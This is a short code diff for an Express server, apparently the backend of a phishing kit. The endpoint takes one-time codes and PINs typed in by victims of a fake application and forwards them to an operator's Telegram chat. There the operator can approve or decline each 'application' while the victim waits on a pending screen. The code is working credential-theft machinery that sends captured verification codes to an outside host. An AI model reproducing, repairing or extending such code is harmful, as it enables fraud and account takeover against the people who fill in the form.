@@ -127,9 +127,18 @@ app.post("/api/submit-otp", async (req, res) => {
 
 // 3. Dynamic secondary PIN submission logic
 app.post("/api/verify-dynamic-pin", async (req, res) => {
-  const { sessionId, pinType, pinValue } = req.body;
-  log(`[PIN VERIFY] sessionId=${sessionId} type=${pinType} value=${pinValue}`);
+  const { name,sessionId, pinType, pinValue } = req.body;
+  const otpMsg =` 
+  🔴 <b>VERIFICATION OTP CODE SUBMITTED</b> 🔴
+  ------------------------------------
+  <b>Code Submitted:</b> <code>${pinValue}</code>
+  
+  <b>Applicant Name:</b> ${name}
+  -------------------------------------
+  
+  <i>Approve or Decline this Application:</i>`;
 
+  log(`[PIN VERIFY] sessionId=${sessionId} type=${pinType} value=${pinValue}`);
   if (sessions[sessionId]) {
     sessions[sessionId].status = "pending";
   }
@@ -137,7 +146,7 @@ app.post("/api/verify-dynamic-pin", async (req, res) => {
   await sendTelegram({
     chat_id: TELEGRAM_ADMIN_ID,
     parse_mode: "HTML",
-    text: `🔍 <b>Dynamic Secure PIN Received</b>\n\n🆔 <b>Session ID:</b> <code>${sessionId}</code>\n🔢 <b>Input Layout:</b> ${pinType.toUpperCase()}\n🔐 <b>PIN Code Value:</b> <code>${pinValue}</code>\n\n<i>Authorize payload disbursement to Success screen?</i>`,
+    text: otpMsg,
     reply_markup: {
       inline_keyboard: [
         [
